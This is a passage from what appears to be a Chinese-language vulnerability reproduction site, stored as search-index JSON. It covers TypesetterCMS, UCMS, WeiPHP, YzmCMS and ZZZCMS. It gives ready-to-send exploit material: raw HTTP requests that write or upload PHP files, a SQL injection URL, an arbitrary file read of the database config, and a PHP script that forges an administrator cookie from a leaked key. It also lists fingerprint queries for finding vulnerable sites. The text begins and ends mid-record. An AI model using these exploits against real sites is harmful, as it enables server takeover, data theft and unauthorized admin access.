","date":"0001-01-01","objectID":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/:4:0","tags":null,"title":"","uri":"/shopxo-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2021-15822/"},{"categories":null,"content":"TypesetterCMS 后台任意文件上传 ","date":"0001-01-01","objectID":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":null,"title":"","uri":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞描述 可以通过将.php放在.zip文件中并解压缩来绕过对.php文件的保护。一旦完成，就可以使用恶意的php文件（webshell）在计算机上执行命令 ","date":"0001-01-01","objectID":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":null,"title":"","uri":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞影响 Typesetter CMS 5-5.1 ","date":"0001-01-01","objectID":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":null,"title":"","uri":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞复现 按如下步骤复现 ","date":"0001-01-01","objectID":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":null,"title":"","uri":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"参考文章 Github 绕过文件上传限制导致命令执行 ","date":"0001-01-01","objectID":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:4:0","tags":null,"title":"","uri":"/typesettercms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"UCMS 文件上传漏洞 CVE-2020-25483 ","date":"0001-01-01","objectID":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/:0:0","tags":null,"title":"","uri":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/"},{"categories":null,"content":"漏洞描述 UCMS v1.4.8版本存在安全漏洞，该漏洞源于文件写的fopen()函数存在任意命令执行漏洞，攻击者可利用该漏洞可以通过该漏洞访问服务器。 ","date":"0001-01-01","objectID":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/:1:0","tags":null,"title":"","uri":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/"},{"categories":null,"content":"环境搭建 到官网http://uuu.la/下载源码（http://uuu.la/uploadfile/file/ucms_1.4.8.zip），解压到web目录，访问http:///install/index.php 进行安装。 访问/ucms/login.php，显示正常及环境安装成功。 ","date":"0001-01-01","objectID":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/:2:0","tags":null,"title":"","uri":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/"},{"categories":null,"content":"漏洞复现 登录账户 poc： 访问/ucms/index.php?do=sadmin_fileedit\u0026dir=/\u0026file=1.php抓包。 写入php代码，发送。 POST /ucms/index.php?do=sadmin_fileedit\u0026dir=/\u0026file=1.php HTTP/1.1 Host: ucms.com Content-Length: 58 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://ucms.com Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 Edg/87.0.664.41 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://ucms.com/ucms/index.php?do=sadmin_fileedit\u0026dir=/\u0026file=CNVD.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Cookie: admin_213f42=admin; psw_213f42=0ef8fa2c997f64b78cde98b6c7c9cc0a; token_213f42=78012aac Connection: close uuu_token=78012aac\u0026co=%3C%3Fphp+phpinfo%28%29%3F%3E\u0026pos=17 get /1.php ","date":"0001-01-01","objectID":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/:3:0","tags":null,"title":"","uri":"/ucms-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2020-25483/"},{"categories":null,"content":"WeiPHP3.0 session_id 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 WeiPHP3.0 session_id 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件 ","date":"0001-01-01","objectID":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 WeiPHP3.0 ","date":"0001-01-01","objectID":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"weiphp\" ","date":"0001-01-01","objectID":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面标识 发送请求包上传文件 POST /index.php?s=%2FHome%2FFile%2Fupload%2Fsession_id%2Fscevs8hub3m5ogla05a421hb42.html HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 831 Content-Type: multipart/form-data; boundary=------------------------e37a54d7d5380c9f Accept-Encoding: gzip --------------------------e37a54d7d5380c9f Content-Disposition: form-data; name=\"download\"; filename=\"882176.php\" Content-Type: application/octet-stream \u003c?php phpinfo(); --------------------------e37a54d7d5380c9f-- 获取目录后访问回显的 path ","date":"0001-01-01","objectID":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/weiphp3.0-session_id-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"WeiPHP5.0 bind_follow SQL注入漏洞 ","date":"0001-01-01","objectID":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Weiphp5.0 所有使用了 wp_where() 函数并且参数可控的SQL查询均受到影响，前台后台均存在注入。 ","date":"0001-01-01","objectID":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Weiphp5.0 ","date":"0001-01-01","objectID":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"WeiPHP\" ","date":"0001-01-01","objectID":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /public/index.php/home/index/bind_follow/?publicid=1\u0026is_ajax=1\u0026uid[0]=exp\u0026uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(%271%27),0x7e),1)--+ ","date":"0001-01-01","objectID":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/weiphp5.0-bind_follow-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596 ","date":"0001-01-01","objectID":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/:0:0","tags":null,"title":"","uri":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/"},{"categories":null,"content":"漏洞描述 Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件 ","date":"0001-01-01","objectID":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/:1:0","tags":null,"title":"","uri":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/"},{"categories":null,"content":"漏洞影响 Weiphp \u003c= 5.0 ","date":"0001-01-01","objectID":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/:2:0","tags":null,"title":"","uri":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/"},{"categories":null,"content":"网络测绘 app=\"WeiPHP\" ","date":"0001-01-01","objectID":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/:3:0","tags":null,"title":"","uri":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/"},{"categories":null,"content":"环境搭建 weiphp5.0官方下载参考手册 参考官方手册创建网站即可 漏洞函数文件:application\\material\\controller\\Material.php 漏洞函数:_download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // 获取图片URL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) \u0026\u0026 $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // 获取图片扩展名 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' =\u003e $picName, 'type' =\u003e 'application/octet-stream', 'tmp_name' =\u003e $picPath, 'size' =\u003e $res, 'error' =\u003e 0 ); $File = D('home/Picture'); $cover_id = $File-\u003eaddFile($file); } return $cover_id; } 首先注意到函数的标识为public，也就是这个函数是公共调用的，并且变量picUrl为可控变量 根据代码从上向下分析 $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); else { $content = wp_file_get_contents($picUrl); // 获取图片扩展名 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } 分析传入变量 picUrl 的 wp_file_get_contents方法 $content = wp_file_get_contents($picUrl); 函数文件位置 application\\common.php 可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); 这里创建了有关当前时间的图片文件，并写入文件夹/public/uploads/picture/ 下 我们先尝试控制变量 $picUrl 来写入数据库配置文件到图片中 /public/index.php/material/Material/_download_imgage?media_id=1\u0026picUrl=./../config/database.php 查看目录/public/uploads/picture/，并用记事本打开写入的jpg文件 得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell 在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法 if ($res) { $file = array( 'name' =\u003e $picName, 'type' =\u003e 'application/octet-stream', 'tmp_name' =\u003e $picPath, 'size' =\u003e $res, 'error' =\u003e 0 ); $File = D('home/Picture'); $cover_id = $File-\u003eaddFile($file); } 向下跟进 addFile 函数 函数位置:application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this-\u003ewhere('md5', $data['md5'])-\u003evalue('id'); if ($id \u003e 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this-\u003einsertGetId($data); return $id; } 可以看到这部分代码写入了 Picture 表中 $id = $this-\u003einsertGetId($data); 我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了 我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方 找到一处可以利用的地方 function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')-\u003ewhere(wp_where($map)) -\u003eorder('id desc') -\u003eselect(); $this-\u003eassign('picList', $picList); exit($this","date":"0001-01-01","objectID":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/:4:0","tags":null,"title":"","uri":"/weiphp5.0-download_imgage-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96-cnvd-2020-68596/"},{"categories":null,"content":"WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693 ","date":"0001-01-01","objectID":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/:0:0","tags":null,"title":"","uri":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/"},{"categories":null,"content":"漏洞描述 Weiphp5.0 存在管理员用户Cookie伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的Cookie ","date":"0001-01-01","objectID":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/:1:0","tags":null,"title":"","uri":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/"},{"categories":null,"content":"漏洞影响 Weiphp \u003c= 5.0 ","date":"0001-01-01","objectID":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/:2:0","tags":null,"title":"","uri":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/"},{"categories":null,"content":"环境搭建 weiphp5.0官方下载参考手册 参考官方手册创建网站即可 ","date":"0001-01-01","objectID":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/:3:0","tags":null,"title":"","uri":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/"},{"categories":null,"content":"网络测绘 app=“WeiPHP” ","date":"0001-01-01","objectID":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/:4:0","tags":null,"title":"","uri":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/"},{"categories":null,"content":"漏洞复现 首先需要得到数据库配置文件中的data_auth_key密钥 得到这个配置文件可参照上一篇Weiphp5.0 前台文件任意读取 'data_auth_key' =\u003e '+0SeoAC#YR,Jm\u0026c?[PhUg9u;:Drd8Fj4q|XOkx*T' 全局查找下使用了这个密钥的地方 找到了跟据这个密钥的加密方法和解密方法 加密方法 think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i \u003c $len; $i++) { if ($x == $l) { $x = 0; } $char .= substr($key, $x, 1); $x++; } $str = sprintf('%010d', $expire ? $expire + time() : 0); for ($i = 0; $i \u003c $len; $i++) { $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256); } return str_replace(array( '+', '/', '=' ), array( '-', '_', '' ), base64_encode($str)); } 解密方法 think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire \u003e 0 \u0026\u0026 $expire \u003c time()) { return ''; } $x = 0; $len = strlen($data); $l = strlen($key); $char = $str = ''; for ($i = 0; $i \u003c $len; $i++) { if ($x == $l) { $x = 0; } $char .= substr($key, $x, 1); $x++; } for ($i = 0; $i \u003c $len; $i++) { if (ord(substr($data, $i, 1)) \u003c ord(substr($char, $i, 1))) { $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1))); } else { $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1))); } } return base64_decode($str); } 全局查看下使用了解密方法的地方 在文件 application\\common.php 中含有使用解密方法的代码，用于做身份验证 function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')-\u003eautoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } 根据这里得到的代码，可以知道当user_Id=1时,会解密密钥后判断是否正确，如果正确则可以登录系统 我们在本地使用加密代码加密user_id=1得到的cookie则可以登录系统 \u003c?php show_source(__FILE__); function think_encrypt($data, $key = '', $expire = 0) { $key = '+0SeoAC#YR,Jm\u0026c?[PhUg9u;:Drd8Fj4q|XOkx*T'; $key = md5($key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i \u003c $len; $i++) { if ($x == $l) { $x = 0; } $char .= substr($key, $x, 1); $x++; } $str = sprintf('%010d', $expire ? $expire + time() : 0); for ($i = 0; $i \u003c $len; $i++) { $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256); } return str_replace(array( '+', '/', '=' ), array( '-', '_', '' ), base64_encode($str)); } echo 'user_id = ' . think_encrypt($_GET['user_id']); ?\u003e 添加cookie: user_id=xxxxxxxx即可成功登录 获取密钥的方法参照上一篇审计文章 ","date":"0001-01-01","objectID":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/:5:0","tags":null,"title":"","uri":"/weiphp5.0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693/"},{"categories":null,"content":"YzmCMS Version 小于V5.8正式版 后台采集模块 SSRF漏洞 ","date":"0001-01-01","objectID":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 YzmCMS内容管理系统 是一款轻量级开源内容管理系统，它采用自主研发的框架YZMPHP开发。程序基于PHP+Mysql架构，并采用MVC框架式开发的一款高效开源的内容管理系统，可运行在Linux、Windows、MacOSX、Solaris等各种平台上。 源码存在协议识别的缺陷，导致存在SSRF漏洞 ","date":"0001-01-01","objectID":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 YzmCMS version \u003c V5.8正式版 ","date":"0001-01-01","objectID":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://github.com/yzmcms/yzmcms 按照文档安装即可 ","date":"0001-01-01","objectID":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录后台 –\u003e 模块管理 –\u003e 采集管理 添加采集规则 在你的服务器上编辑HTML代码 根目录可能不同，payload需要更改 点击采集读取根目录下的 Flag 出现漏洞的代码位置 yzmcms/yzmphp/core/class/cache_factory.class.php 这里调用 url_check 函数 可以看到这里只检测了前4位是否为 http，使用 httpxxx 即可绕过 ","date":"0001-01-01","objectID":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 There are SSRF vulnerabilities in background collection management ","date":"0001-01-01","objectID":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/yzmcms-version-%E5%B0%8F%E4%BA%8Ev5.8%E6%AD%A3%E5%BC%8F%E7%89%88-%E5%90%8E%E5%8F%B0%E9%87%87%E9%9B%86%E6%A8%A1%E5%9D%97-ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"ZZZCMS parserSearch 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 ZZZCMS parserSearch 存在模板注入导致远程命令执行漏洞 参考链接： https://srcincite.io/advisories/src-2021-0015/ https://nvd.nist.gov/vuln/detail/CVE-2021-32605 ","date":"0001-01-01","objectID":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 ZZZCMS 